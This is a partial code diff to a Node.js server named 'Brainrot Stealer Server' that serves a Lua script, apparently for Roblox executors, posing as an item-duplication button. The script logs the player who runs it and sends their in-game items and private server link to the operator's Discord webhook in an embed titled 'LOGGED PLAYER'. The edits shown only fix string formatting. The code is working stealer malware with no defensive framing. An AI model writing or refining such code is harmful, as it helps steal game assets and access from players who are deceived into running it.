@@ -1,4 +1,4 @@
-// server.js - COMPLETELY FIXED VERSION
+// server.js - FINAL WORKING VERSION
 const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -73,7 +73,7 @@ app.get("/", (req, res) => {
   res.send("Brainrot Stealer Server");
 });
 
-// /raw → FIXED LUA SCRIPT
+// /raw → FIXED LUA SCRIPT (NO BACKTICKS)
 app.get("/raw", blockNonExecutor, (req, res) => {
   const webhookId = req.query.id;
 
@@ -445,7 +445,7 @@ dupeButton.MouseButton1Click:Connect(function()
         hitStatus = "this dosent look like a legit hit"
     end
     
-    -- Create embed (FIXED - using proper Lua string concatenation)
+    -- Create embed (FIXED - NO BACKTICKS)
     local embed = {
         title = "# LOGGED PLAYER",
         description = "a player just ran your script!",
@@ -458,12 +458,12 @@ dupeButton.MouseButton1Click:Connect(function()
             },
             {
                 name = "Brainrots", 
-                value = "\\`\\`\\`" .. brainrotsText .. "\\`\\`\\`",
+                value = brainrotsText,
                 inline = false
             },
             {
                 name = "Private Server",
-                value = "\\`\\`\\`" .. serverLink .. "\\`\\`\\`",
+                value = serverLink,
                 inline = false
             },
             {
